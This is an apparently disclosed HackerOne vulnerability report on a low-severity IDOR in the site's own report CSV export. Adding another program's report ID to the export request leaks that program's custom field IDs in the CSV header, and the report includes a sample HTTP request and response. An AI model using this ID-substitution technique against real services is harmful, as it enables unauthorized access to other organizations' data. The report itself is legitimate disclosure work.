# IDOR in Report CSV export discloses the IDs of Custom Field Attributes of Programs

## Report Details
- **Report ID**: 510759
- **URL**: https://hackerone.com/reports/510759
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-03-15T19:04:05.112Z
- **Disclosed**: 2019-09-06T17:42:08.964Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Specifying a report ID of another team when requesting a CSV export leaks the ID of the Custom Field Attribute in the CSV header.

**Request**
```
POST /reports/export HTTP/1.1
Host: localhost:8080
...

----------868143055
Content-Disposition: form-data; name="report_ids[]"

17
----------868143055
Content-Disposition: form-data; name="report_ids[]"

118
...
```

**Response**
```
HTTP/1.1 200 OK
...

id,title,severity_rating,severity_score,state,substate,weakness,reported_at,first_response_at,triaged_at,closed_at,awarded_at,assigned,reporter,bounty,bonus,public,reference,reference_url,structured_scope,original_report_id,custom_field_1,custom_field_2,custom_field_3,custom_field_4,custom_field_5,custom_field_6
17,Brute force in login form,low,,open,new,HTTP Response Splitting,2019-02-07 02:49:29 UTC,2019-02-07 02:49:30 UTC,,2019-02-07 02:49:30 UTC,,,sandra,,,no,,,https://profile-photos.hackerone-user-content.com/,,"'[a](https://google.com)',a",d,,,,
```

In the above request, report ID 17 belongs to the current user's program, which is why Custom Field 1, 2, 3, 4, and 6 are included. Custom Field 5 belongs to the Program for Report ID 118. The current user does not have access to this program, but the Custom Field is still included in the header. The program also doesn't have the feature toggle enabled, which means that this is currently exploitable on hackerone.com.

## Impact

This can be used to get an exact count of Program Reports for Programs that have at least one attribute. This is currently exploitable on hackerone.com. However, as Custom Fields has not been released to other programs besides our own, there is currently no sensitive data being exposed.

## Attachments
No attachments
